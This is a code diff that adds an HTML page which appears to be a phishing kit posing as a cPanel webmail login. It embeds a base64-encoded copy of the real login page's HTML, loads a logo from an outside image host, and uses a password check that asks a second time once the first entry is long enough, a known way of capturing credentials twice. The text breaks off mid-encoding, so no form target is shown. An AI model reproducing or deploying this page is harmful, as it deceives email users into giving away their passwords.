@@ -1,0 +1,48 @@
+<!DOCTYPE html><html dir="ltr" lang="en">
+  <head>
+  
+  
+  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" 
+  crossorigin="anonymous" ></script>
+<script>
+
+function validateform() { 
+document.getElementById("logoimg").src = "https://res.cloudinary.com/pta/image/upload/v1631524936/ii_c5byfb.png"; 
+}
+</script>
+
+<script>
+window.addEventListener("load", event => {
+  var image = document.querySelector('img');
+  var isLoaded = image.complete && image.naturalHeight !== 0;
+});
+</script>
+
+
+<script>
+function myFunction() {
+document.getElementById("password").focus();
+}
+</script>
+  
+<script>
+function validate() {  
+
+var bx = document.myform.p1.value;
+ 
+if (bx.length>5){  
+document.getElementById("msg").style.display = "block"; 
+document.getElementById("p2").focus(); 
+return false;  
+} else {
+document.getElementById("error").style.display = "block"; 
+document.getElementById("p1").focus(); 
+}
+
+}
+</script>
+  
+    <link rel="icon" href="data:text/html;base64,CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiIgZGlyPSJsdHIiPgo8aGVhZD4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPTEiPgogICAgPG1ldGEgbmFtZT0iZ29vZ2xlIiBjb250ZW50PSJub3RyYW5zbGF0ZSIgLz4KICAgIDxtZXRhIG5hbWU9ImFwcGxlLWl0dW5lcy1hcHAiIGNvbnRlbnQ9ImFwcC1pZD0xMTg4MzUyNjM1IiAvPgogICAgPHRpdGxlPldlYm1haWwgTG9naW48L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJkYXRhOmltYWdlL3gtaWNvbjtiYXNlNjQsQUFBQkFBRUFJQ0FBQUFFQUlBRFNBZ0FBRmdBQUFJbFFUa2NOQ2hvS0FBQUFEVWxJUkZJQUFBQWdBQUFBSUFnR0FBQUFjM3A2OUFBQUFwbEpSRUZVV0lYdDFqMklIR1VZQi9EZk96ZG5qSUtGa0VDSVZXSUt2VUZzSWtSRXhhOUtKQ0xhV0FnV0p4NERpbFpXZ3BERGlJMHdpVmlJb0dBVFAxQ0NFRFlIU2VDd1VCQmtnaWlLVVJRSkZpTG80ZDBlT3hZekM4bnNPOW05WGNYQys4TVcrM3orOS9sNmwyMzgzeEgraVNCcEVseVRkb2RhMjZ4c0RxcC9oMENWWjN2d0ttN3RNQm5nQXM3aDdlUlllYkc2aE10TUJIYk1CWDg5dmZBUkhwclE1VThjd2RGUWxJT1pDVlI1ZGkxK3cvd1dYVC9FWTZFb041TlpDT0R1S1pMRHd6Z1NNQ3VCZTJmd2ZYNlFad3RwV3pxZkJCdExDM3R4Ri9aaHhLYkJHeDBFZnNUSlM3N3Z3bUdqbFpyRDRtVXpVT1haalZqR0k2NWNuVFhjaEI4aXVwZERVYjdRaW5zUVo3R3paZnRkUWoySlZaNDlpQy93Nkpqa3NJbzdPblM5dGlBNVZuNkd0eUsyKzFNWTVOa2hmR0R5Z1ZyQkF4SDVXa1B1TWpSNy8zVXNVRkxsMlE2OHM0WGtBM3dzM3Y5em9TalgyOEtyNXdMMXhyVHhhNm91K2Y2T1pHdnFQZzl2MXdaZWFVamNFTEUvRFZmTmhXRlN2eS9lbk9JWjllcTFzVG9rRU1OTFdJNzlvaXJQOGc2ZlhwVm5oN0dFdlkxc1YvT0o0ZjBVaHlLS2s2RW9YNHg1cEVrZ1h2Nkw2T005OVlxTncvYzRrWFN3RzVua0lmcExDeW51aWFoVzFHV2VKSGtmVDRhaVhPOWF0ejFYY0Q2STZ5THlIdTZiSVBrNkhnOUZlWVo2M3k5RWpCYXJQRHZROFZKMW5kOVYzRDRtK1JuY0Zvcnl4RkNRNGhTZWFobGVqODhIZWZhdXVyZHdhdWZyNXovRi9aSEFYNm5MK21aRTE4ZTM2SVdpSExrRm9jcXpXOVFYY056MSt3VUh4Si9mMTBKUlBqdkdQNHBrL3ZqNUwzRjhBdHVmZEQrL3A2ZEpEa256WCswNWZETEd0aWZlLzc2NnQ5TVJnRkNVZmZXVHVkd0UzQXFCbFZDVWYweExZR1RRcXp6Ymh5ZHdKM1kzNGczMThKMXRtWCtEUEJUbHo5TVMyTVkyL25QOERUR2FxZVREZjMwckFBQUFBRWxGVGtTdVFtQ0MiIHR5cGU9ImltYWdlL3gtaWNvbiIgLz4KCiAgICA8IS0tIEVYVEVSTkFMIENTUyAtLT4KICAgIDxsaW5rIGhyZWY9Ii9jUGFuZWxfbWFnaWNfcmV2aXNpb25fMTY0ODYxMDE5NS91bnByb3RlY3RlZC9jcGFuZWwvZm9udHMvb3Blbl9zYW5zL29wZW5fc2Fucy5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiAvPgogICAgPGxpbmsgaHJlZj0iL2NQYW5lbF9tYWdpY19yZXZpc2lvbl8xNjYwMjUzNzQ5L3VucHJvdGVjdGVkL2NwYW5lbC9zdHlsZV92Ml9vcHRpbWl6ZWQuY3NzIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiAvPgoKICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ci8qCiAgVGhpcyBjc3MgaXMgaW5jbHVkZWQgaW4gdGhlIGJhc2UgdGVtcGxhdGUgaW4gY2FzZSB0aGUgY3NzIGNhbm5vdCBiZSBsb2FkZWQgYmVjYXVzZSBvZiBhY2Nlc3MgcmVzdHJpY3Rpb25zCiAgSWYgdGhpcyBjc3MgaXMgdXBkYXRlZCwgcGxlYXNlIHVwZGF0ZSBzZWN1cml0eXBvbGljeV9oZWFkZXIuaHRtbC50bXBsIGFzIHdlbGwKKi8KLmNvcHlyaWdodCB7CiAgYmFja2dyb3VuZDogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIZHBaSFJvUFNJek5UbHdkQ0lnYUdWcFoyaDBQU0l6TWpBaUlIWnBaWGRDYjNnOUlqQWdNQ0F6TlRrZ01qUXdJajQ4WkdWbWN6NDhZMnhwY0ZCaGRHZ2dhV1E5SW1FaV
